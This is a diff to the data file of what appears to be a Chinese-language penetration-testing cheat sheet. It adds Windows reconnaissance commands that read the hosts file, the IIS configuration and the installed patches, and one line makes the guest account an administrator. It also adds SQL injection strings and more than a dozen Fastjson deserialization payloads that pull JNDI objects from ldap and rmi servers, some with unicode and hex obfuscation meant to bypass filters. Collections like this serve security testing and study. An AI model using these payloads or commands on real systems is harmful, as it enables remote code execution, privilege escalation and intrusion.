@@ -252,22 +252,24 @@ getData([
 							"content-h4": [
 								"winver",
 								"ver",
-								"systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"",
+								"systeminfo | findstr /B /C:\"OS\"",
 								"net config workstation",
 								"wmic os get buildnumber,caption,CSDVersion /format:csv",
 								"type C:\\\\windows\\system32\\drivers\\etc\\hosts",
 								"type C:\\\\windows\\system32\\inetsrv\\config\\applicationHost.config",
-								"echo %PROCESSOR_ARCHITECTURE%"
+								"echo %PROCESSOR_ARCHITECTURE%",
+								"wmic qfe list full /format:htable > ./1.html"
 							],
 							"annotation": [
+								"查看版本（会弹窗）",
+								"查看版本",
 								"",
-								"",
-								"",
-								"",
-								"",
+								"工作站相关信息",
+								"查看版本",
 								"",
 								"如果安装iis服务器可以查看iis配置信息",
-								"查看系统架构"
+								"查看系统架构",
+								"查看系统补丁情况"
 							]
 						}]
 					},
@@ -284,9 +286,9 @@ getData([
 								"net localgroup administrators guest /add"
 							],
 							"annotation": [
+								"显示会话的信息",
 								"",
-								"",
-								"",
+								"显示当前用户名、属于的组以及安全标识符",
 								"",
 								"",
 								"",
@@ -437,9 +439,11 @@ getData([
 								"' AND userid IS NULL; --",
 								"' waitfor delay '0:0:10'--",
 								"'order by 3--+",
-								"declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)"
+								"declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)",
+								"1' and 1 like if(1 like 1,1,exp(1)) --"
 							],
 							"annotation": [
+								"",
 								"",
 								"",
 								"",
@@ -1102,15 +1106,41 @@ getData([
 	{
 		"left-nav-title": "Fastjson",
 		"card-item-content": [{
-				"card-item-header": "CVE-2017-18349",
+				"card-item-header": "Fastjson反序列化",
 				"card-item-body": [{
-						"card-item-h4": "@type",
+						"card-item-h4": "漏洞检测",
 						"card-item-content-h4": [{
 							"content-h4": [
-								"{\"e\":{\"@type\":\"java.net.Inet4Address\",\"val\":\"hbs9jr.dnslog.cn\"}}",
-								"{\"dik1xu\": {\"\\u0040t\\u0079\\u0070\\u0065\":\"L\\u0063om.su\\u006E.rows\\u0065\\x74.\\x4A\\u0064\\u0062cRo\\u0077SetIm\\x70l;\",\"dataSourceName\": \"rmi://106.52.238.135:8001/i/hcSvqI7U/a1da25/hnm3/gyoz/PQ5P8iBh/\",\"autoCommit\": true}}"
+								"{\"e\":{\"@type\":\"java.net.Inet4Address\",\"val\":\"dnslog.cn\"}}",
+								"{\"@type\":\"java.net.Inet6Address\",\"val\":\"dnslog\"}",
+								"{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"dnslog\"}}",
+								"{\"@type\":\"com.alibaba.fastjson.JSONObject\", {\"@type\": \"java.net.URL\", \"val\":\"dnslog\"}}\"\"}",
+								"{{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"}:\"aaa\"}",
+								"{{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"}:0",
+								"{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:9999/Exploit\", \"autoCommit\":true}",
+								"{\"dik1xu\": {\"\\u0040t\\u0079\\u0070\\u0065\":\"L\\u0063om.su\\u006E.rows\\u0065\\x74.\\x4A\\u0064\\u0062cRo\\u0077SetIm\\x70l;\",\"dataSourceName\": \"rmi://localhost:8001/i/hcSvqI7U/a1da25/hnm3/gyoz/PQ5P8iBh/\",\"autoCommit\": true}}",
+								"{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://localhost:9999/Exploit\", \"autoCommit\":true}",
+								"{\"xxx\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:6666/Evail\", \"autoCommit\":true}}",
+								"{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:6666/Evail\",\"autoCommit\":true}}",
+								"{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://localhost:9999/Exploit\"}}",
+								"{\"a\": {\"@type\": \"java.lang.Class\",\"val\": \"com.sun.rowset.JdbcRowSetImpl\"}, \"b\": {\"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\": \"ldap://localhost:1389/Exploit\",\"autoCommit\": true}}",
+								"{\"@type\":\"oracle.jdbc.connector.OracleManagedConnectionFactory\",\"xaDataSourceName\":\"rmi://localhost:1099/ExportObject\"}",
+								"{\"@type\":\"org.apache.commons.configuration.JNDIConfiguration\",\"prefix\":\"ldap://localhost:1389/ExportObject\"}"
 							],
 							"annotation": [
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"",
+								"Unicode、Hex变形",
+								"重复 L 和 ; 绕过",
+								"",
+								"",
+								"",
+								"",
 								"",
 								""
 							]
